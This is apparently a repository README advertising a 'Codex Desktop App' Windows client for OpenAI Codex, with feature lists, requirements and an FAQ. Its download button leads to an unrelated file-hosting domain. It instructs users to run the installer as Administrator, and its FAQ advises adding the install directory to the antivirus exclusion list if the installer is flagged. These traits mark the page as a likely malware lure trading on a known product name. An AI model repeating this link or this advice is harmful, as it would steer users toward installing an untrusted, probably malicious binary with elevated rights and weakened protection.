# Codex Desktop App

Codex Desktop App is the native Windows client for OpenAI Codex, designed for teams and individual developers who work with AI agents across real codebases. The application provides a structured workspace for running multiple agents in parallel, each isolated in its own Git worktree, and for reviewing proposed changes through a visual diff before they are applied. It runs natively on Windows inside a dedicated sandbox, executes commands through PowerShell, and supports reusable Skills, scheduled background tasks, and integrations with common development platforms.

[![Download Codex Desktop App](https://img.shields.io/badge/Download-Codex_Desktop_App-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-26.1023-blue)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-555555)
![Status](https://img.shields.io/badge/status-active-2ea44f)
![License](https://img.shields.io/badge/license-proprietary-lightgrey)

<details>
<summary>Table of Contents</summary>

- [Installation](#installation)
- [System Requirements](#system-requirements)
- [Core Capabilities](#core-capabilities)
- [Module Reference](#module-reference)
- [Rationale](#rationale)
- [Use Cases](#use-cases)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Keywords](#keywords)

</details>

## Installation

1. Download the installer using the button above.
2. Run the installer as Administrator and complete the setup wizard.
3. Launch Codex and sign in with your ChatGPT account or API key.

On first launch, the application opens to the project dashboard. Create a new agent thread or resume an existing session from the sidebar.

## System Requirements

| Component | Requirement |
|-----------|-------------|
| Operating System | Windows 10 version 19041 or later; Windows 11 supported |
| Architecture | 64-bit |
| Memory | 8 GB recommended |
| Disk Space | 1 GB available |
| Privileges | Administrator rights required for sandbox configuration |

## Core Capabilities

### Agent Management

- Parallel agent threads, each with an independent conversation history and file context.
- Git worktree isolation, ensuring that concurrent agent work does not modify the same working copy.
- Session continuity across projects, with state preserved between launches.
- Project-level organization for repositories, tasks, and environments.

### Change Review

- Visual diff review for every proposed modification, with line-level inspection.
- Inline comment support for directing revisions before a change is accepted.
- Direct handoff to the code editor when manual adjustment is required.
- Browser preview pane for validating front-end changes in context.

### Execution Environment

- Native Windows sandbox with restricted tokens and filesystem access controls.
- PowerShell as the primary shell for agent commands and the integrated terminal.
- Optional WSL mode for teams whose toolchains run on Linux.
- Administrator approval required for any operation that attempts to leave the sandbox.

### Skills and Extensibility

- Reusable Skills that package instructions, scripts, and supporting resources for consistent agent behavior across projects.
- Plugin integrations covering issue tracking, continuous integration, source control, and productivity platforms.
- Built-in image generation for interface mockups and asset preparation.

### Background Operations

- Scheduled tasks that execute while the application is running in the background.
- Persistent memory of preferences and corrections, reducing repeated instruction.
- Summary pane consolidating the agent's plan, sources, and produced artifacts for each session.

## Module Reference

| Module | Description | Access |
|--------|-------------|--------|
| Agent Threads | Independent agent sessions with isolated context | Sidebar |
| Worktrees | Separate working copies per agent | Automatic |
| Diff Review | Line-level inspection of proposed changes | Session view |
| Sandbox | Restricted execution environment | Settings |
| Skills | Reusable instruction packages | Skills library |
| Image Generation | Visual asset creation | Prompt bar |
| Browser Preview | Front-end validation pane | Side panel |
| Integrations | Source control and issue tracking connectors | Settings |

## Rationale

- Parallelism is architectural, not additive. Agent threads and worktree isolation are built into the application's core design.
- Windows-native execution. The sandbox, PowerShell support, and WSL mode are implemented specifically for Windows development environments.
- Review precedes application. Every change passes through a visual diff before it reaches a repository.
- Extensibility is centralized. Skills and plugins provide a single mechanism for adapting agent behavior to a team's workflow.
- Continuity is preserved. Sessions, preferences, and scheduled tasks persist across launches.

## Use Cases

- Managing several concurrent code changes without one agent overwriting another's work.
- Reviewing agent output through diff inspection before merging into a shared branch.
- Standardizing recurring workflows through Skills so that agent behavior matches team conventions.
- Running scheduled maintenance, triage, and reporting tasks in the background.
- Preparing interface assets and mockups directly within the development environment.

## Frequently Asked Questions

**Are Administrator rights required for installation?**
Administrator rights are required for the sandbox configuration step to complete correctly.

**What should I do if antivirus software flags the installer?**
Verify the publisher signature and, if necessary, add the installation directory to the antivirus exclusion list.

**Is Windows 11 supported?**
Yes. Windows 11 is the recommended baseline; Windows 10 version 19041 or later is also supported.

**Is a paid subscription required?**
Codex is available across ChatGPT subscription tiers and through API keys, with usage limits that vary by plan.

**How are updates delivered?**
Updates are available through the in-application update check or by downloading the latest installer using the button above.

## Keywords

Codex Desktop App, Codex for Windows, OpenAI Codex client, AI coding agent, parallel agent sessions, Git worktree isolation, visual diff review, Windows sandbox, PowerShell integration, WSL support, Codex Skills, Codex plugins, scheduled agent tasks, code review automation, developer productivity, AI-assisted development, Codex desktop requirements, Codex Windows 11, OpenAI developer tools, Codex background automation

## Disclaimer

This repository is an informational resource. Use the application in accordance with the terms of service of the platform it connects to.
